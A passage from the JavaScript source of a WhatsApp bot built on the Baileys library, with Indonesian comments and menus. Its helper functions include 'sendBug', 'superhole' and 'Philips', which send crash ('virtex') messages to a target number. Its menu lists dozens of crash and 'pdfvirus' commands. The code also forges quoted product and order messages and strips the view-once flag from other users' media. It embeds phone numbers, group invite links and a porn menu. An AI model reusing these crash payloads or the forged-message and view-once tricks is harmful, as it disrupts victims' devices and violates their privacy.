            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "kurzxd",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
 const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": iye //Gambarnye
					},
					"title": `${ucapanWaktu} ${pushname}`, //Kasih namalu 
					"description": `${ucapanWaktu} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${ucapanWaktu} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        kurzxd.sendMessage(to, media, type, {
          quoted: kurz,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
///Button Text

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
kurzxd.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await kurzxd.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
kurzxd.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await kurzxd.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
kurzxd.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await kurzxd.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
kurzxd.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
function superhole(nomor){
for(let i=0;i < 1;i++){
let nyefir = areatext.barVir(prefix)
kurzxd.sendMessage(nomor, nyefir, MessageType.extendedText, {quoted:fdoc})
}
function bug(jid){
for(let i=0;i < 1;i++){
var WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
kurzxd.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
  }
  function Philips(nomor){
for(let i=0;i < 1;i++){
let nyelips = areatext.Philips(prefix)
kurzxd.sendMessage(nomor, nyelips, MessageType.extendedText, {quoted:fdoc})
}
  }
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        kurzxd.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      kurzxd.groupAdd(from, orangnya);
    };
        const grupinv = (teks) => {
        	grup = kurzxd.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `Argio Dev`, "footerText": "*_© Dcode Denpa_*", "jpegThumbnail": iye, "caption": teks}}, {quoted:kurz})
            kurzxd.relayWAMessage(grup)
        }
const fakeitem = (teks) => {
            kurzxd.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`./database/group/logo.jpg`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`Ndyie Botz`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
// Katalog
const reply = (teks) => {
				kurzxd.sendMessage(from, teks, text, {quoted:kurz})
		   }
		   const zreply = (teks) => {
             res = kurzxd.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 111119999, "message": teks, "footerText": "*kurzxd Botz*", "thumbnail": bgg, "surface": 'CATALOG' }}, {quoted:fdoc})
             kurzxd.relayWAMessage(res)
}
const fakewa = (teks) => {        
kurzxd.sendMessage(from, teks, text, { thumbnail: fake, sendEphemeral: true, quoted: kurz, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/6283146208804?text=Assalamualaikum`}}})
		}
const replyfakelink = (teks) => {
kurzxd.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp-BOT\nM a a n. (@_Ndyie Botz) •Instagram photos and Videos`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://a.top4top.io/p_2073icief0.jpg",
                "thumbnail": fake,
                "sourceUrl": ``
},mentionedJid:[sender]}, quoted : fgif})
};
const replywa = (teks) => {
kurzxd.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp`,
                "body": `wa.me/6283146208804`,
                "mediaType": "10",
                "mediaUrl": `wa.me/6281314050985`,
                "thumbnailUrl": "https://j.top4top.io/p_20682m4yj0.jpg",
                "thumbnail": iye,
                "sourceUrl": `wa.me/6283146208804`,
},mentionedJid:[sender]}, quoted : kurz})
};
const fakeyt = (teks) => {
kurzxd.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `hallo ${pushname}` ,
"body": `${ucapanWaktu}`,
"mediaType": "2",
"thumbnailUrl": "https://c.top4top.io/p_2087f30hj1.jpeg",
"mediaUrl": "https://youtu.be/uygjD8rqVLE",
"thumbnail": fs.readFileSync('./database/group/logo.jpg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fgif})
};
// Support Di Versi 3.5.2 
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await kurzxd.relayWAMessage(
        kurzxd.prepareMessageFromContent(
          target,
          kurzxd.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      kurzxd.sendMessage(target, teks, "conversation");
    };

    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!kurz.key.remoteJid.endsWith("@g.us") && offline) {
      if (!kurz.key.fromMe) {
        if (isAfk(kurz.key.remoteJid)) return;
        addafk(kurz.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        kurzxd.sendMessage(
          kurz.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./database/group/logo.jpg"),
                },
              },
            },
          }
        );
      }
    }
    if (kurz.key.remoteJid.endsWith("@g.us") && offline) {
      if (!kurz.key.fromMe) {
        if (kurz.message.extendedTextMessage != undefined) {
          if (kurz.message.extendedTextMessage.contextInfo != undefined) {
            if (
              kurz.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of kurz.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(kurz.key.remoteJid)) return;
                  addafk(kurz.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  kurzxd.sendMessage(
                    kurz.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./database/group/logo.jpg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");

/*if (listbut) console.log("[",color("command","lime"),"]",time2,color(listbut,"lime"),"from",color(sender.split("@")[0],"cyan"))*/
//list command

async function sendFileFromUrl(from, url, caption, msg, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return kurzxd.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: kurz, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283833310095@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6281314050985@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
       const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + 'FN:kurzxd BOTZ\n'
            + 'TEL;type=CELL;type=VOICE;waid=6285339388512:+6285339388512\n' 
            + 'END:VCARD'
        chatss = (type === 'conversation') ? kurz.message.conversation : (type === 'extendedTextMessage') ? kurz.message.extendedTextMessage.text : ''

    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !kurz.key.fromMe) {
      if (budy.includes("https://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        kurzxd.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...kurz };
      msg.kurz = kurz.message.viewOnceMessage.message;
      msg.kurz[Object.keys(msg.kurz)[0]].viewOnce = false;
      kurzxd.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !kurz.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        kurzxd.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("https://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        kurzxd.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !kurz.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        kurzxd.groupRemove(from, [sender]);
      }
    }
    // Runtime Di Bio Bang🌹\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await kurzxd.setStatus(`Mode Bot Aktif Selama ${uptime}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    if (!kurz.key.fromMe && banChats === true) return;
switch(command) {
			   case 'public':
          	if (!kurz.key.fromMe && !isOwner) return
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	reply(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!kurz.key.fromMe && !isOwner) return
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	reply(`「 *SELF-MODE* 」`)
          	break
case 'bugvn2':
if (!kurz.key.fromMe && !isOwner) return
sssssss = fs.readFileSync('./audio/date.mp3')
kurzxd.sendMessage(from, sssssss, document, { quoted: kurz, filename:`${jadivirtex1}.mp3`, mimetype: 'audio/application' })
break
          	case 'welcome':
					if (!isGroup) return reply(mess.only.group)					
					if (args.length < 1) return reply('Hmmmm')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Udah aktif um')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
                                      break	
case 'setname':
if (!isGroup) return reply(`Apa Apa An Ini`)
if (!isGroupAdmins) return reply(`Apa Apa An Ini`)
if (!isBotGroupAdmins) return reply(`Apa Apa An Ini`)
kurzxd.groupUpdateSubject(from, `${body.slice(9)}`)
kurzxd.sendMessage(from, `\`\`\`✓Sukses Mengganti Nama Group Menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'imgtag':
			 if (!kurz.key.fromMe) return reply('Lu siapa')
            if (!kurz.key.fromMe && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !kurz.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(kurz).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : kurz
            file = await kurzxd.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await kurzxd.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: kurz
            }
            ini_buffer = fs.readFileSync(file)
            kurzxd.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
case 'setdesc':
if (!isGroup) return reply(`Apa Apa An Ini`)
if (!isGroupAdmins) return reply(`Apa Apa An Ini`)
if (!isBotGroupAdmins) return reply(`Apa Apa An Ini`)
kurzxd.groupUpdateDescription(from, `${body.slice(9)}`)
kurzxd.sendMessage(from, `\`\`\`✓Sukses Mengganti Deskripsi Group\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: ftrol })
break
                                      case 'menu':
                                      case 'help':
			gambar = thumb
                   timestamp = speed();
				latensi = speed() - timestamp
              menunya = 
`
╭─❒ 「 Bot Info 」 ❒
├ Nama Bot : ӄʊʀʐ
├ Prefix : Multi Prefix

├ Runtime : ${runtime(process.uptime())}
├ Language : Javascript & Nodejs
└❏

╭─❒ 「 User Info 」 ❒
├ Nama  : ${pushname}
├ Nomor : ${sender.split('@')[0]}
└❏

╭─⬣「 Bot Menu 」⬣
│ 🏴‍☠️ ${prefix}colongsw 
│ 🏴‍☠️ ${prefix}bc
│ 🏴‍☠️ ${prefix}bcnowm
│ 🏴‍☠️ ${prefix}self
│ 🏴‍☠️ ${prefix}public
└⬣

╭─⬣「 Group Menu 」⬣
│ 🏴‍☠️ ${prefix}welcome
│ 🏴‍☠️ ${prefix}promote
│ 🏴‍☠️ ${prefix}demote
│ 🏴‍☠️ ${prefix}add
│ 🏴‍☠️ ${prefix}kick
│ 🏴‍☠️ ${prefix}setdesc
│ 🏴‍☠️ ${prefix}setname
│ 🏴‍☠️ ${prefix}hidetag
│ 🏴‍☠️ ${prefix}sticktag
│ 🏴‍☠️ ${prefix}imgtag
│ 🏴‍☠️ ${prefix}tagall
└⬣

╭─⬣「 Maker Menu 」⬣
│ 🏴‍☠️ ${prefix}attp
│ 🏴‍☠️ ${prefix}sticker
│ 🏴‍☠️ ${prefix}nulis
│ 🏴‍☠️ ${prefix}maker2d2
│ 🏴‍☠️ ${prefix}maker2d3
│ 🏴‍☠️ ${prefix}maker2d4
│ 🏴‍☠️ ${prefix}maker3d
│ 🏴‍☠️ ${prefix}maker3d2
│ 🏴‍☠️ ${prefix}maker3d3
│ 🏴‍☠️ ${prefix}maker3d4
│ 🏴‍☠️ ${prefix}coffeecup
│ 🏴‍☠️ ${prefix}coffeecup2
│ 🏴‍☠️ ${prefix}neon
└⬣

╭─⬣「 Sound Menu 」⬣
│ 🏴‍☠️ ${prefix}sound1
│ 🏴‍☠️ ${prefix}sound2
│ 🏴‍☠️ ${prefix}sound3
│ 🏴‍☠️ ${prefix}sound4
│ 🏴‍☠️ ${prefix}sound5
│ 🏴‍☠️ ${prefix}sound6
│ 🏴‍☠️ ${prefix}sound7
│ 🏴‍☠️ ${prefix}sound8
│ 🏴‍☠️ ${prefix}sound9
│ 🏴‍☠️ ${prefix}sound10
│ 🏴‍☠️ ${prefix}sound11
│ 🏴‍☠️ ${prefix}sound12
│ 🏴‍☠️ ${prefix}sound13
│ 🏴‍☠️ ${prefix}sound14
│ 🏴‍☠️ ${prefix}sound15
│ 🏴‍☠️ ${prefix}sound16
│ 🏴‍☠️ ${prefix}sound17
│ 🏴‍☠️ ${prefix}sound18
│ 🏴‍☠️ ${prefix}sound19
│ 🏴‍☠️ ${prefix}sound20
│ 🏴‍☠️ ${prefix}sound21
│ 🏴‍☠️ ${prefix}sound22
│ 🏴‍☠️ ${prefix}sound23
│ 🏴‍☠️ ${prefix}sound24
│ 🏴‍☠️ ${prefix}sound25
│ 🏴‍☠️ ${prefix}sound26
│ 🏴‍☠️ ${prefix}sound27
│ 🏴‍☠️ ${prefix}sound28
│ 🏴‍☠️ ${prefix}sound29
│ 🏴‍☠️ ${prefix}sound30
│ 🏴‍☠️ ${prefix}sound31
└⬣
	
╭─⬣「 Convert Menu 」⬣
│ 🏴‍☠️ ${prefix}fast
│ 🏴‍☠️ ${prefix}slow
│ 🏴‍☠️ ${prefix}tomp3
│ 🏴‍☠️ ${prefix}tomp4
│ 🏴‍☠️ ${prefix}toimg
│ 🏴‍☠️ ${prefix}reverse
│ 🏴‍☠️ ${prefix}pastebin
└⬣

╭─⬣「 Porn Menu 」⬣
│ 🏴‍☠️ ${prefix}link1
│ 🏴‍☠️ ${prefix}link2
│ 🏴‍☠️ ${prefix}link
└⬣

╭─⬣「 Anime Menu 」⬣
│ 🏴‍☠️ ${prefix}kodenuklir
│ 🏴‍☠️ ${prefix}nekopoi1
│ 🏴‍☠️ ${prefix}nekopoi2
│ 🏴‍☠️ ${prefix}nekopoi3
│ 🏴‍☠️ ${prefix}nekopoi4
│ 🏴‍☠️ ${prefix}nekopoi5
│ 🏴‍☠️ ${prefix}nekopoi6
│ 🏴‍☠️ ${prefix}nekopoi7
│ 🏴‍☠️ ${prefix}nekopoi8
│ 🏴‍☠️ ${prefix}nekopoi9
└⬣

╭─⬣「 Search Menu 」⬣
│ 🏴‍☠️ ${prefix}ytsearch
│ 🏴‍☠️ ${prefix}playstore
│ 🏴‍☠️ ${prefix}chara
│ 🏴‍☠️ ${prefix}lirik
│ 🏴‍☠️ ${prefix}brainly
│ 🏴‍☠️ ${prefix}pinterest
│ 🏴‍☠️ ${prefix}githubstalk
│ 🏴‍☠️ ${prefix}igstalk
└⬣

╭─⬣「 Bug Menu 」⬣
│ 🏴‍☠️ ${prefix}xbug
│ 🏴‍☠️ ${prefix}bugpc
│ 🏴‍☠️ ${prefix}bugpc2
│ 🏴‍☠️ ${prefix}bugbrutal
│ 🏴‍☠️ ${prefix}bugrow
│ 🏴‍☠️ ${prefix}bugbutton
│ 🏴‍☠️ ${prefix}bug [Jumlah]
│ 🏴‍☠️ ${prefix}bugv2 [Jumlah]
│ 🏴‍☠️ ${prefix}buggc [Jumlah]
│ 🏴‍☠️ ${prefix}sendbug [Jumlah]
│ 🏴‍☠️ ${prefix}bugtext [Jumlah] 
│ 🏴‍☠️ ${prefix}bugstik 
│ 🏴‍☠️ ${prefix}bugpdf 
│ 🏴‍☠️ ${prefix}pdfvirus 
│ 🏴‍☠️ ${prefix}pdfvirusreal 
│ 🏴‍☠️ ${prefix}bugdoc 
│ 🏴‍☠️ ${prefix}bugdokumen 
│ 🏴‍☠️ ${prefix}bugdokumenv2 
│ 🏴‍☠️ ${prefix}sendallvirtex 
│ 🏴‍☠️ ${prefix}katalog 
│ 🏴‍☠️ ${prefix}katalogv2 
│ 🏴‍☠️ ${prefix}katalogv3 
│ 🏴‍☠️ ${prefix}jadic [teks] [tag gambar] 
│ 🏴‍☠️ ${prefix}jadicv2 [teks] [tag gambar] 
│ 🏴‍☠️ ${prefix}jadicv3 [teks] [tag gambar] 
│ 🏴‍☠️ ${prefix}jadicv4 [teks] [tag gambar] 
│ 🏴‍☠️ ${prefix}jadicv5 [teks] [tag gambar] 
│ 🏴‍☠️ ${prefix}jadicgb [teks] [tag gambar] 
│ 🏴‍☠️ ${prefix}jadivirgam [tag gambar] 
│ 🏴‍☠️ ${prefix}jadivirgamv2 [tag gambar] 
│ 🏴‍☠️ ${prefix}jadivirgamv3 [tag gambar] 
│ 🏴‍☠️ ${prefix}tovirgam [tag Sticker] 
│ 🏴‍☠️ ${prefix}tovirgamv2 [tag Sticker] 
│ 🏴‍☠️ ${prefix}tovirgamv3 [tag Sticker] 
│ 🏴‍☠️ ${prefix}bugtroli 
│ 🏴‍☠️ ${prefix}troli 
│ 🏴‍☠️ ${prefix}troliv2 
│ 🏴‍☠️ ${prefix}bugsungsw 
│ 🏴‍☠️ ${prefix}bugsungswv2 
│ 🏴‍☠️ ${prefix}bugcombine 
│ 🏴‍☠️ ${prefix}buglokasi 
│ 🏴‍☠️ ${prefix}buglokasiv2 
│ 🏴‍☠️ ${prefix}allbuglokasi 
│ 🏴‍☠️ ${prefix}buglociphone 
│ 🏴‍☠️ ${prefix}buglocandro [teks] 
│ 🏴‍☠️ ${prefix}bugliveloc 
│ 🏴‍☠️ ${prefix}virlok [teks] 
│ 🏴‍☠️ ${prefix}bugimg 
│ 🏴‍☠️ ${prefix}bugimgv2 
│ 🏴‍☠️ ${prefix}bugr 
│ 🏴‍☠️ ${prefix}bughole 
│ 🏴‍☠️ ${prefix}superhole 
│ 🏴‍☠️ ${prefix}bugweb [teks] 
│ 🏴‍☠️ ${prefix}bugwebv2 [teks] 
│ 🏴‍☠️ ${prefix}buglink 
│ 🏴‍☠️ ${prefix}buggif 
│ 🏴‍☠️ ${prefix}kurzxddgx 
│ 🏴‍☠️ ${prefix}bugarawareal 
│ 🏴‍☠️ ${prefix}bugarawa 
│ 🏴‍☠️ ${prefix}bugarawaza 
│ 🏴‍☠️ ${prefix}jadivirus [Reply] 
│ 🏴‍☠️ ${prefix}bugvn 
│ 🏴‍☠️ ${prefix}bugvn2 
│ 🏴‍☠️ ${prefix}bugvideo 
│ 🏴‍☠️ ${prefix}bugvideov2 
│ 🏴‍☠️ ${prefix}kurz 
│ 🏴‍☠️ ${prefix}jadivirtex [teks] 
│ 🏴‍☠️ ${prefix}jadivirtexv2 [teks] 
│ 🏴‍☠️ ${prefix}hen 
│ 🏴‍☠️ ${prefix}spamvirtex [Total] 
│ 🏴‍☠️ ${prefix}bugnulis [teks] 
│ 🏴‍☠️ ${prefix}bugneon [teks] 
│ 🏴‍☠️ ${prefix}buginvite 
│ 🏴‍☠️ ${prefix}bugtagall [teks] 
│ 🏴‍☠️ ${prefix}jadiphilips [teks] [tag gambar] 
│ 🏴‍☠️ ${prefix}jadiphilipsv2 [teks] [tag Sticker] 
│ 🏴‍☠️ ${prefix}jadibugpdf [teks] [tag gambar] 
│ 🏴‍☠️ ${prefix}jadibugpdfv2 [teks] [tag Sticker] 
│ 🏴‍☠️ ${prefix}jadibugjson [teks] [tag Gambar] 
│ 🏴‍☠️ ${prefix}jadibugjsonv2 [teks] [tag Sticker] 
│ 🏴‍☠️ ${prefix}jadibugjs [teks] [tag Gambar]
│ 🏴‍☠️ ${prefix}jadibugjsv2 [teks] [tag Sticker]
│ 🏴‍☠️ ${prefix}jadibugxml [teks] [tag Gambar]
│ 🏴‍☠️ ${prefix}jadibugxmlv2 [teks] [tag Sticker]
│ 🏴‍☠️ ${prefix}jadibugzip [teks] [tag Gambar]
│ 🏴‍☠️ ${prefix}jadibugzipv2 [teks] [tag Sticker]
│ 🏴‍☠️ ${prefix}jadibug7z [teks] [tag Gambar]
│ 🏴‍☠️ ${prefix}jadibug7zv2 [teks] [tag Sticker]
└⬣`
teks =
`BODY-BOT`
but = [
          { buttonId: `${prefix}infobot`, buttonText: { displayText: 'INFO' }, type: 1 },
          { buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 },
